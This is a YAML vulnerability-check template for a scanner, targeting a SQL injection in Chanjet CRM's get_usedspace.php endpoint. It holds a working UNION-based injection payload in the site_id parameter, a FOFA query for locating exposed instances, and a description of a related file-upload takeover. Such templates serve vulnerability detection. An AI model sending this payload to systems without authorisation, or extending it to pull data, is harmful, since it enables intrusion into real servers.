expression: r0()
id: chanjet-crm-get-usedspace-sql-injection
info:
  author: daffainfo
  description: "\u7545\u6377CRM\u662F\u9762\u5411\u5C0F\u4F01\u4E1A\u5168\u529B\u6253\
    \u9020\u7684\u7B80\u5355\u3001\u5B9E\u7528\u7684\u5BA2\u6237\u5173\u7CFB\u7BA1\
    \u7406\u5E94\u7528!\u7545\u6377CRM\u5E2E\u52A9\u4F01\u4E1A\u7528\u597D\u81EA\u5DF1\
    \u7684\u5BA2\u6237\u8D44\u6E90\u3001\u7BA1\u597D\u5546\u673A\u8DDF\u8FDB\u8FC7\
    \u7A0B\u3001\u5F15\u5BFC\u597D\u4E1A\u52A1\u5458\u8DDF\u5355\u884C\u4E3A\u3002\
    \u7545\u6377CRM\u7CFB\u7EDF\u5B58\u5728SQL\u6CE8\u5165\u548C\u540E\u53F0\u6587\
    \u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\
    \u4E0A\u4F20\u6728\u9A6C\u6267\u884C\u4EFB\u610F\u547D\u4EE4\uFF0C\u83B7\u53D6\
    \u670D\u52A1\u5668\u7BA1\u7406\u6743\u9650\u3002\nfofa-query: title=\"\u7545\u6377\
    CRM\"\n"
  name: "\u7545\u6377CRM SQL\u6CE8\u5165+\u540E\u53F0\u6587\u4EF6\u4E0A\u4F20\u6F0F\
    \u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/ZjjXqN1RDeOQIH9ueTPymQ
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'old6old6old6')
    request:
      method: GET
      path: /webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x6f6c6436,0x6f6c6436,0x6f6c6436)--
